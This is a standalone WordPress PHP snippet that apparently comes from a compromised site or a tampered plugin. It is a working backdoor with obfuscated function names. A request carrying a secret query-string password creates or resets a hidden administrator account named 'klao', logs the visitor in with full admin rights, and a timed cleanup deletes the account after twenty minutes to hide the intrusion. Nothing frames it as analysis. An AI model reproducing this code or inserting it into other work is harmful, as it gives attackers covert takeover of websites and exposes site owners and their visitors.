<?php

add_action('init', 'a2fwwglwploop_bdzet');
add_action('init', 'a2f_run_onlyaa_once');
function a2fwwglwploop_bdzet()
{
    if (isset($_GET['nwmmm']) && $_GET['nwmmm'] == 'zxc@z^%zSi' && $_GET['p'] == 'nwm') {
        add_option('nwm_create_time', current_time('timestamp'));
        if (!username_exists('klao')) {
            $password = wp_generate_password(20, true, true);
            $user_id  = wp_create_user('klao', $password);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            wp_clear_auth_cookie();
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);

            wp_redirect(get_admin_url());
            exit;
        } else {
            $user = get_user_by('login', 'klao');
            $new_password = 'HelloWorld' . current_time('timestamp');
            wp_set_password($new_password, $user->ID);

            wp_clear_auth_cookie();
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);

            wp_redirect(get_admin_url());
            exit;
        }
    }
}

function a2f_run_onlyaa_once()
{
    require_once(ABSPATH . 'wp-admin/includes/user.php');
    if (get_option('nwm_create_time')) {
        $t = get_option('nwm_create_time');
        $current = current_time('timestamp');
        if ($current > ($t + 1200)) {
            $user = get_user_by('login', 'klao');
            wp_delete_user($user->ID);
            delete_option('nwm_create_time');
        }
    }
}
